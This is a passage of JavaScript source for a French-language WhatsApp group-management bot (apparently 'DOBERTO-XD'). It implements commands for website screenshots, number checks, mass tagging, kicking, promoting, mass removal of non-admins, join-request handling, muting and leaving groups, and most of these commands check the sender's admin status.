  } catch (err) {
    console.error("ANTILINK CASE ERROR", err);
    await socket.sendMessage(from, { text: '❌ Erreur lors de la gestion du mode Anti-Link.' }, { quoted: msg });
  }
  break;
}


// ---------------- CASE ssweb (robuste) ----------------
case 'ssweb': {
  try {
    // body et args doivent être disponibles depuis messages.upsert
    const textToParse = (typeof body === 'string' && body.trim()) ? body.trim() : (msg.body || msg.text || '');
    const raw = textToParse.replace(new RegExp(`^\\${prefix}${command}\\s*`, 'i'), '').trim();
    // supporte : .ssweb <url> ou .ssweb <url> <width>x<height>
    const parts = raw.split(/\s+/).filter(Boolean);
    const urlCandidate = parts[0] || (args && args.length ? args[0] : '');
    const sizeArg = parts[1] || (args && args.length > 1 ? args[1] : '');

    if (!urlCandidate) {
      await socket.sendMessage(from, { text: `❌ Fournis une URL.\nExemple: ${prefix}${command} https://www.google.com` }, { quoted: msg });
      break;
    }

    // Normaliser l'URL
    let url = urlCandidate.trim();
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;

    // Parse taille si fournie (ex: 1920x1080)
    let width = 1280, height = 720;
    if (sizeArg && /^\d+x\d+$/i.test(sizeArg)) {
      const [w, h] = sizeArg.split('x').map(n => parseInt(n, 10));
      if (Number.isFinite(w) && Number.isFinite(h)) {
        width = Math.min(Math.max(w, 200), 3840); // bornes raisonnables
        height = Math.min(Math.max(h, 200), 2160);
      }
    }

    // Réaction "en cours"
    try { await socket.sendMessage(from, { react: { text: "⏳", key: msg.key } }); } catch (e) {}

    // Appel API avec timeout
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 20000); // 20s timeout

    const apiUrl = `https://www.movanest.xyz/v2/ssweb?url=${encodeURIComponent(url)}&width=${width}&height=${height}&full_page=true`;
    const apiRes = await fetch(apiUrl, { method: 'GET', headers: { Accept: 'application/json' }, signal: controller.signal });
    clearTimeout(timeout);

    if (!apiRes.ok) {
      const txt = await apiRes.text().catch(() => '');
      console.error('SSWEB HTTP ERROR', apiRes.status, txt);
      await socket.sendMessage(from, { text: "❌ Erreur réseau lors de l'appel à l'API." }, { quoted: msg });
      break;
    }

    const apiData = await apiRes.json().catch(() => null);
    const imageUrl = apiData?.result || apiData?.url || apiData?.data || null;

    if (!imageUrl || typeof imageUrl !== 'string') {
      console.error('SSWEB BAD RESPONSE', apiData);
      await socket.sendMessage(from, { text: "❌ Impossible de générer la capture d'écran (réponse inattendue)." }, { quoted: msg });
      break;
    }

    // Télécharger l'image retournée par l'API (buffer)
    try {
      const controller2 = new AbortController();
      const timeout2 = setTimeout(() => controller2.abort(), 20000);
      const imgRes = await fetch(imageUrl, { method: 'GET', signal: controller2.signal });
      clearTimeout(timeout2);

      if (!imgRes.ok) {
        console.error('SSWEB IMAGE HTTP ERROR', imgRes.status);
        // fallback : envoyer l'URL si l'envoi en buffer échoue
        await socket.sendMessage(from, { text: `✅ Capture prête mais impossible de télécharger l'image. Voici le lien :\n${imageUrl}` }, { quoted: msg });
        break;
      }

      const contentType = imgRes.headers.get('content-type') || '';
      if (!/^image\//i.test(contentType)) {
        console.error('SSWEB IMAGE NOT IMAGE', contentType);
        await socket.sendMessage(from, { text: `❌ L'API n'a pas renvoyé une image valide.` }, { quoted: msg });
        break;
      }

      const arrayBuffer = await imgRes.arrayBuffer();
      const buffer = Buffer.from(arrayBuffer);

      // Envoi de l'image en buffer
      await socket.sendMessage(from, { image: buffer, caption: `✅ Capture de ${url}` }, { quoted: msg });

    } catch (e) {
      console.error('SSWEB DOWNLOAD IMAGE ERROR', e);
      // fallback : envoyer l'URL si téléchargement échoue
      await socket.sendMessage(from, { text: `✅ Capture prête mais impossible de télécharger l'image. Voici le lien :\n${imageUrl}` }, { quoted: msg });
    }

    // Réaction "ok"
    try { await socket.sendMessage(from, { react: { text: "☑️", key: msg.key } }); } catch (e) {}

  } catch (err) {
    console.error("SSWEB ERROR:", err);
    try { await socket.sendMessage(from, { react: { text: "❌", key: msg.key } }); } catch (e) {}
    await socket.sendMessage(from, { text: "❌ Erreur lors de la génération de la capture d'écran." }, { quoted: msg });
  }
  break;
}
   
 case 'checkban': {
  try {
    const target = (args[0] || '').replace(/[^0-9]/g, '');
    if (!target) {
      return await socket.sendMessage(sender, {
        text: '❌ Utilisation : .checkban 509xxxxxxx'
      }, { quoted: msg });
    }

    // Vérifier si le numéro est fonctionnel sur WhatsApp
    let result;
    try {
      result = await socket.onWhatsApp(target + '@s.whatsapp.net');
    } catch (e) {
      console.error('[CHECKBAN ERROR]', e);
      result = null;
    }

    // vCard factice pour quoted meta
    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_CHECKBAN"
      },
      message: {
        contactMessage: {
          displayName: 'DOBERTO-XD',
          vcard: `BEGIN:VCARD
VERSION:3.0
N:DOBERTO-XD;;;;
FN:DOBERTO-XD
ORG:DOBERTO-XD
TEL;type=CELL;type=VOICE;waid=${target}:${target}
END:VCARD`
        }
      }
    };

    // Construire la réponse
    let reply;
    if (result && result.length > 0 && result[0]?.exists) {
      reply = `✅ Numéro *${target}* actif sur WhatsApp.\nRien à signaler.\n\n_© Doberto XD_`;
    } else {
      reply = `☠️ Numéro *${target}* banni ou inexistant.\nCe num est dead mon gars.\n\n_© Doberto XD_`;
    }

    await socket.sendMessage(sender, { text: reply }, { quoted: shonux });

  } catch (err) {
    console.error('[CHECKBAN CASE ERROR]', err);
    await socket.sendMessage(sender, {
      text: `❌ Erreur lors de la vérification : ${err.message || err}`
    }, { quoted: msg });
  }
  break;
}
 
 
case 'antistatusmention': {
  try {
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (!from.endsWith('@g.us')) {
      return await socket.sendMessage(sender, {
        text: '❌ Cette commande doit être utilisée dans un groupe.'
      }, { quoted: msg });
    }

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      return await socket.sendMessage(sender, {
        text: '❌ Seul le propriétaire de la session ou du bot peut changer ce mode.'
      }, { quoted: msg });
    }

    // Charger la config actuelle
    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    if (typeof cfg.antistatusmention === 'undefined') cfg.antistatusmention = false;
    if (typeof cfg.antistatusmention_threshold === 'undefined') cfg.antistatusmention_threshold = 2;

    // Construire le texte d’état
    const statusText = cfg.antistatusmention
      ? `✅ AntiStatusMention activé\n⚠️ Seuil: ${cfg.antistatusmention_threshold}`
      : `⛔ AntiStatusMention désactivé\n⚠️ Seuil: ${cfg.antistatusmention_threshold}`;

    // Construire le bouton ON/OFF
    const buttons = [
      {
        buttonId: cfg.antistatusmention ? 'antistatusmention_off' : 'antistatusmention_on',
        buttonText: { displayText: cfg.antistatusmention ? 'OFF' : 'ON' },
        type: 1
      }
    ];

    await socket.sendMessage(sender, {
      text: `⚙️ Paramètre AntiStatusMention\n\n${statusText}\n\nClique sur le bouton pour changer.`,
      buttons: buttons,
      headerType: 1
    }, { quoted: msg });

  } catch (err) {
    console.error('[ANTISTATUS SWITCH ERROR]', err);
    await socket.sendMessage(sender, {
      text: `❌ Erreur lors du changement de mode : ${err.message || err}`
    }, { quoted: msg });
  }
  break;
}

// Gestion des boutons
case 'antistatusmention_on': {
  const sanitized = String(number || '').replace(/[^0-9]/g, '');
  let cfg = await loadUserConfigFromMongo(sanitized) || {};
  cfg.antistatusmention = true;
  await setUserConfigInMongo(sanitized, cfg);
  await socket.sendMessage(from, { text: '✅ AntiStatusMention activé.' }, { quoted: msg });
  break;
}

case 'antistatusmention_off': {
  const sanitized = String(number || '').replace(/[^0-9]/g, '');
  let cfg = await loadUserConfigFromMongo(sanitized) || {};
  cfg.antistatusmention = false;
  await setUserConfigInMongo(sanitized, cfg);
  await socket.sendMessage(from, { text: '⛔ AntiStatusMention désactivé.' }, { quoted: msg });
  break;
}

// ---------------- CASE tagall ----------------
case 'tagall': {
  try {
    if (!from || !from.endsWith('@g.us')) {
      await socket.sendMessage(sender, { text: '❌ Cette commande ne peut être utilisée que dans les groupes.' }, { quoted: msg });
      break;
    }

    let gm = null;
    try { gm = await socket.groupMetadata(from); } catch(e) { gm = null; }
    if (!gm) { await socket.sendMessage(sender, { text: '❌ Impossible de récupérer les infos du groupe.' }, { quoted: msg }); break; }

    const participants = gm.participants || [];
    if (!participants.length) { await socket.sendMessage(sender, { text: '❌ Aucun membre trouvé.' }, { quoted: msg }); break; }

    const sanitized  = (number || '').replace(/[^0-9]/g, '');
    const cfg        = await loadUserConfigFromMongo(sanitized) || {};
    const botName    = cfg.botName || BOT_NAME_FANCY;
    const groupName  = gm.subject || 'Groupe';
    const totalMbrs  = participants.length;
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    const userNum    = senderNumber || sender.split('@')[0];
    const msgText    = args && args.length ? args.join(' ') : 'ATTENTION EVERYONE!';
    const dateStr    = new Date().toLocaleDateString('en-US', {
      month: 'numeric', day: 'numeric', year: 'numeric',
      timeZone: 'America/Port-au-Prince'
    });

    let groupPP = '';
    try { groupPP = await socket.profilePictureUrl(from, 'image'); } catch(e){}

    const mentions = participants.map(p => p.id || p.jid).filter(Boolean);

    let caption = [
      `┌──────────────────────●`,
      `│ Bot Name: *${botName}*`,
      `│ Group: *${groupName}*`,
      `│ Date: ${dateStr}`,
      `│ Membres: ${totalMbrs}`,
      `│ Admins: ${adminCount}`,
      `│ Use: @${userNum}`,
      `└──────────────────────●`,
      ``,
      `| *${botName}*`,
      ``,
      `┌─── MESSAGES ───`,
      `📣 *${msgText}*`,
      `└────────────────`,
      ``,
      `┌─── MEMBERS ───`
    ].join('\n');

    participants.forEach(m => {
      const id = m.id || m.jid;
      if (!id) return;
      caption += `\n│ 🌏 @${id.split('@')[0]}`;
    });
    caption += `\n└────────────────`;

    await socket.sendMessage(from, {
      image: { url: groupPP || 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption,
      mentions,
    }, { quoted: msg });

  } catch (err) {
    console.error('tagall error', err);
    await socket.sendMessage(sender, { text: "❌ Erreur lors de l'exécution de tagall." }, { quoted: msg });
  }
  break;
}

// ---------------- CASE setgpp ----------------
case 'setgpp': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent changer la photo du groupe.' }, { quoted: msg });
      break;
    }
    if (!botJid || !groupAdminsJid.includes(botJid)) {
      await socket.sendMessage(from, { text: '❌ Le bot doit être admin pour changer la photo du groupe.' }, { quoted: msg });
      break;
    }

    // Récupérer le message cité ou courant
    const ctx = msg.message?.extendedTextMessage?.contextInfo || {};
    const quoted = msg.quoted || (ctx?.quotedMessage ? { message: ctx.quotedMessage } : null);
    const target = quoted?.message ? quoted.message : msg.message;
    const contentType = getContentType(target);

    if (!contentType || !/image|document/.test(contentType)) {
      await socket.sendMessage(from, { text: '❗ Réponds à une image (ou envoie l\'image) avec .setgpp pour définir la photo du groupe.' }, { quoted: msg });
      break;
    }

    // Téléchargement robuste du buffer
    let buffer = null;
    try {
      if (typeof socket.downloadMediaMessage === 'function') {
        buffer = await socket.downloadMediaMessage(quoted || msg);
      }
      if (!buffer && typeof downloadContentFromMessage === 'function') {
        const type = contentType.includes('image') ? 'image' : 'document';
        const stream = await downloadContentFromMessage(target[contentType], type);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        buffer = Buffer.concat(chunks);
      }
    } catch (e) { buffer = null; }

    if (!buffer) {
      await socket.sendMessage(from, { text: '❌ Impossible de télécharger l\'image. Essaie de renvoyer l\'image et réessaye.' }, { quoted: msg });
      break;
    }

    // Mise à jour de la photo de groupe (selon version Baileys)
    let updated = false;
    try {
      if (typeof socket.updateProfilePicture === 'function') {
        await socket.updateProfilePicture(from, buffer);
        updated = true;
      }
    } catch (e) { updated = false; }

    if (!updated && typeof socket.groupUpdateProfilePicture === 'function') {
      try {
        await socket.groupUpdateProfilePicture(from, buffer);
        updated = true;
      } catch (e) { updated = false; }
    }

    if (!updated) {
      await socket.sendMessage(from, { text: '❌ Impossible de mettre à jour la photo du groupe : méthode non supportée par cette version de la librairie.' }, { quoted: msg });
      break;
    }

    await socket.sendMessage(from, { text: '✅ Photo de groupe mise à jour avec succès.' }, { quoted: msg });
  } catch (e) {
    console.error('SETGPP ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}


case 'hidetag': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }
  try {
    const { participants } = await require('./normalize').getGroupAdminsInfo(socket, from);

    // Récupérer le texte (sans la commande elle-même)
    const text = args.join(' ').trim();
    if (!text) {
      await socket.sendMessage(from, { text: 'Usage: .h <message> (ex: .h salut ou .h 😂)' }, { quoted: msg });
      break;
    }

    // Construire la liste des mentions (JID complets)
    const mentions = participants.map(p => p.jid).filter(Boolean);
    if (!mentions.length) {
      await socket.sendMessage(from, { text: '❌ Aucun membre détecté à mentionner.' }, { quoted: msg });
      break;
    }

    // Message final avec watermark
    const payloadText = `${text}\n\n> 𝐓𝐀𝐆𝐆𝐄𝐃 𝐁𝐘 𝐃𝐎𝐁𝐄𝐑𝐓𝐎-𝐗𝐃 🇺🇸`;

    await socket.sendMessage(from, { text: payloadText, mentions }, { quoted: msg });

    // Supprimer la commande envoyée par l'utilisateur (si supporté par ta version de Baileys)
    try {
      await socket.sendMessage(from, { delete: msg.key });
    } catch (e) {
      console.error('DELETE HIDETAG COMMAND ERROR', e);
    }
  } catch (e) {
    console.error('HIDETAG ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'listadmin': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }
  try {
    const { metadata, participants, groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    let text = `👑 Admins (JID) — ${metadata?.subject || 'groupe'}\n\n`;
    if (!groupAdminsJid.length) text += 'Aucun admin détecté.';
    else groupAdminsJid.forEach((a, i) => text += `${i+1}. ${a}\n`);
    text += `\n🤖 Bot JID: ${botJid || 'non détecté'}`;
    await socket.sendMessage(from, { text }, { quoted: msg });
  } catch (e) {
    console.error('LISTADMIN ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE kick ----------------
case 'kick': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent utiliser cette commande.' }, { quoted: msg });
      break;
    }
    if (!botJid || !groupAdminsJid.includes(botJid)) {
      await socket.sendMessage(from, { text: '❌ Le bot doit être admin pour retirer des membres.' }, { quoted: msg });
      break;
    }

    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (!mentions.length) {
      await socket.sendMessage(from, { text: 'Usage: .kick @membre' }, { quoted: msg });
      break;
    }

    // filtrer : ne pas retirer les admins ni le bot
    const toRemove = mentions.filter(m => !groupAdminsJid.includes(m) && m !== botJid);
    if (!toRemove.length) {
      await socket.sendMessage(from, { text: '❌ Aucune cible valide (cible est admin ou bot).' }, { quoted: msg });
      break;
    }

    await socket.groupParticipantsUpdate(from, toRemove, 'remove');
    await socket.sendMessage(from, { text: `✅ Retiré(s): ${toRemove.map(j => j.split('@')[0]).join(', ')}`, mentions: toRemove }, { quoted: msg });
  } catch (e) {
    console.error('KICK ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE add ----------------
case 'add': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, { text: '❗ Utilise cette commande dans un groupe.' }, { quoted: msg });
    break;
  }
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent ajouter des membres.' }, { quoted: msg });
      break;
    }
    const number = args[0];
    if (!number) return await socket.sendMessage(from, { text: 'Usage: .add <num sans +>' }, { quoted: msg });
    const clean = number.replace(/\D/g, '');
    const jidToAdd = `${clean}@s.whatsapp.net`;
    await socket.groupParticipantsUpdate(from, [jidToAdd], 'add');
    await socket.sendMessage(from, { text: `✅ Ajouté: ${jidToAdd}` }, { quoted: msg });
  } catch (e) {
    console.error('ADD ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE promote ----------------
case 'promote': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent promouvoir.' }, { quoted: msg });
    if (!botJid || !groupAdminsJid.includes(botJid)) return await socket.sendMessage(from, { text: '❌ Le bot doit être admin.' }, { quoted: msg });

    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (!mentions.length) return await socket.sendMessage(from, { text: 'Usage: .promote @membre' }, { quoted: msg });

    const toPromote = mentions.filter(m => !groupAdminsJid.includes(m) && m !== botJid);
    if (!toPromote.length) return await socket.sendMessage(from, { text: '❌ Aucune cible valide à promouvoir.' }, { quoted: msg });

    await socket.groupParticipantsUpdate(from, toPromote, 'promote');
    await socket.sendMessage(from, { text: `✅ Promu(s): ${toPromote.map(j => j.split('@')[0]).join(', ')}`, mentions: toPromote }, { quoted: msg });
  } catch (e) {
    console.error('PROMOTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE demote ----------------
case 'demote': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent rétrograder.' }, { quoted: msg });
    if (!botJid || !groupAdminsJid.includes(botJid)) return await socket.sendMessage(from, { text: '❌ Le bot doit être admin.' }, { quoted: msg });

    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (!mentions.length) return await socket.sendMessage(from, { text: 'Usage: .demote @membre' }, { quoted: msg });

    const toDemote = mentions.filter(m => groupAdminsJid.includes(m) && m !== botJid);
    if (!toDemote.length) return await socket.sendMessage(from, { text: '❌ Aucune cible admin valide à rétrograder.' }, { quoted: msg });

    await socket.groupParticipantsUpdate(from, toDemote, 'demote');
    await socket.sendMessage(from, { text: `✅ Rétrogradé(s): ${toDemote.map(j => j.split('@')[0]).join(', ')}`, mentions: toDemote }, { quoted: msg });
  } catch (e) {
    console.error('DEMOTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE kickall ----------------
case 'kickall': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { participants, groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent utiliser kickall.' }, { quoted: msg });
    if (!botJid || !groupAdminsJid.includes(botJid)) return await socket.sendMessage(from, { text: '❌ Le bot doit être administrateur.' }, { quoted: msg });

    const nonAdminJids = participants
      .map(p => p.jid)
      .filter(Boolean)
      .filter(j => !groupAdminsJid.includes(j) && j !== botJid);

    const unique = [...new Set(nonAdminJids)];
    if (!unique.length) return await socket.sendMessage(from, { text: '❌ Pa gen manm ki pa admin pou retire.' }, { quoted: msg });

    // Envoyer le message avec image + newsletter
    await socket.sendMessage(from, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: `╔══════════════════╗\n║  🚫 *KICKALL AKTIF*  ║\n╚══════════════════╝\n\n⏳ Ap retire *${unique.length}* manm pa 100...\n\n> ${config.BOT_FOOTER}`,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });

    // Retire pa 100
    const chunkSize = 100;
    for (let i = 0; i < unique.length; i += chunkSize) {
      const batch = unique.slice(i, i + chunkSize);
      await socket.groupParticipantsUpdate(from, batch, 'remove');
      await new Promise(r => setTimeout(r, 1500)); // Rete 1.5s ant chak batch
    }

    await socket.sendMessage(from, {
      text: `✅ *${unique.length}* membres retirés avec succès !\n\n> ${config.BOT_FOOTER}`,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });

  } catch (e) {
    console.error('KICKALL ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur : ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'acceptall': {
  if (!from.endsWith('@g.us')) break;
  try {
    // Vérifier que l’expéditeur est admin
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent accepter les demandes.' }, { quoted: msg });
      break;
    }

    // Récupérer les demandes en attente
    const requests = await socket.groupRequestParticipantsList(from);
    if (!requests || requests.length === 0) {
      await socket.sendMessage(from, { text: 'ℹ️ Aucune demande en attente.' }, { quoted: msg });
      break;
    }

    // Accepter toutes les demandes
    for (const req of requests) {
      await socket.groupRequestParticipantsUpdate(from, [req.jid], 'approve');
    }
    await socket.sendMessage(from, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: `╔══════════════════╗\n║  ✅ *ACCEPTALL*  ║\n╚══════════════════╝\n\n✅ *${requests.length}* demandes acceptées avec succès!\n\n> ${config.BOT_FOOTER}`,
      contextInfo: { forwardingScore: 999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363407485857714@newsletter', newsletterName: config.BOT_NAME, serverMessageId: 143 } }
    }, { quoted: msg });
  } catch (e) {
    console.error('ACCEPTALL ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'revokeall': {
  if (!from.endsWith('@g.us')) break;
  try {
    // Vérifier que l’expéditeur est admin
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent rejeter les demandes.' }, { quoted: msg });
      break;
    }

    // Récupérer les demandes en attente
    const requests = await socket.groupRequestParticipantsList(from);
    if (!requests || requests.length === 0) {
      await socket.sendMessage(from, { text: 'ℹ️ Aucune demande en attente.' }, { quoted: msg });
      break;
    }

    // Rejeter toutes les demandes
    for (const req of requests) {
      await socket.groupRequestParticipantsUpdate(from, [req.jid], 'reject');
    }

    await socket.sendMessage(from, { text: `🚫 ${requests.length} demandes rejetées.` }, { quoted: msg });
  } catch (e) {
    console.error('REVOKEALL ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE mute / unmute ----------------
case 'mute': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent activer mute.' }, { quoted: msg });
    }

    if (typeof socket.groupSettingUpdate === 'function') {
      await socket.groupSettingUpdate(from, 'announcement'); // admin-only

      // Récupérer tous les participants
      const metadata = await socket.groupMetadata(from);
      const participants = metadata.participants.map(p => p.id);

      await socket.sendMessage(from, { 
        text: '🔇 Groupe en mode admin-only.',
        mentions: participants
      }, { quoted: msg });
    } else {
      await socket.sendMessage(from, { text: '❌ Méthode groupSettingUpdate non disponible.' }, { quoted: msg });
    }
  } catch (e) {
    console.error('MUTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'unmute': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) {
      return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent désactiver mute.' }, { quoted: msg });
    }

    if (typeof socket.groupSettingUpdate === 'function') {
      await socket.groupSettingUpdate(from, 'not_announcement'); // everyone can send

      // Récupérer tous les participants
      const metadata = await socket.groupMetadata(from);
      const participants = metadata.participants.map(p => p.id);

      await socket.sendMessage(from, { 
        text: '🔊 Groupe rouvert, tout le monde peut parler.',
        mentions: participants
      }, { quoted: msg });
    } else {
      await socket.sendMessage(from, { text: '❌ Méthode groupSettingUpdate non disponible.' }, { quoted: msg });
    }
  } catch (e) {
    console.error('UNMUTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE leave ----------------
case 'leave': {
  // Ne traiter que les commandes envoyées dans un groupe
  if (!from.endsWith('@g.us')) break;

  // Préparer la fausse vCard (quoted meta) avec le nom du bot
  try {
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || 'DOBERTO XD';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_LEAVE"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:DOBERTO-XD
TEL;type=CELL;type=VOICE;waid=${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}:${config.OWNER_NUMBER}
END:VCARD`
        }
      }
    };

    // Déterminer l'émetteur (JID et numéro)
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    const senderNum = (String(senderJid || '').split('@')[0] || '').replace(/[^0-9]/g, '');
    const ownerNum = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    // Autorisation : seul le propriétaire de la session ou le bot owner peut forcer le bot à quitter
    if (senderNum !== sanitized && senderNum !== ownerNum) {
      // Message en français indiquant la restriction
      await socket.sendMessage(from, {
        text: '❌ Seul le propriétaire de cette session ou le propriétaire du bot peut demander au bot de quitter le groupe.'
      }, { quoted: shonux });
      break;
    }

    // Tentative de départ du groupe
    try {
      await socket.groupLeave(from);
      // Confirmation publique dans le groupe (optionnel : on peut aussi envoyer en privé au propriétaire)
      await socket.sendMessage(from, {
        text: `✅ Le bot ${botName} a quitté le groupe sur demande de ${senderNum}.`
      }, { quoted: shonux });
      if (process.env.LOG_LEVEL === 'debug') console.info(`[LEAVE] session ${sanitized} left group ${from} by ${senderNum}`);
    } catch (leaveErr) {
      console.error('[LEAVE] Erreur lors de la tentative de quitter le groupe', leaveErr);
      await socket.sendMessage(from, {
        text: `❌ Impossible de quitter le groupe : ${leaveErr?.message || leaveErr}`
      }, { quoted: shonux });
    }

  } catch (e) {
    console.error('LEAVE ERROR', e);
    // En cas d'erreur inattendue, on répond avec la vCard si possible
    try {
      const fallbackShonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_LEAVE_FALLBACK" },
        message: { contactMessage: { displayName: 'BASEBOT-MD', vcard: `BEGIN:VCARD\nVERSION:3.0\nN:BASEBOT-MD;;;;\nFN:BASEBOT-MD\nEND:VCARD` } }
      };
      await socket.sendMessage(from, { text: `❌ Erreur lors de l'exécution de la commande leave : ${e?.message || e}` }, { quoted: fallbackShonux });
    } catch (ignore) { /* ignore */ }
  }
  break;
}
// ---------------- CASE TESTGRP ----------------
case 'testgrp': {
  // Cette commande affiche comment le bot reçoit les infos du groupe et des participants
  // Utilise : .testgrp (dans un groupe) ou en MP pour tester un groupe (si from est un groupe)
  try {
    // Vérifier contexte
    if (!from) break;

    // Si pas dans un groupe, on informe et on propose d'utiliser .testgrp en groupe
    if (!from.endsWith('@g.us')) {
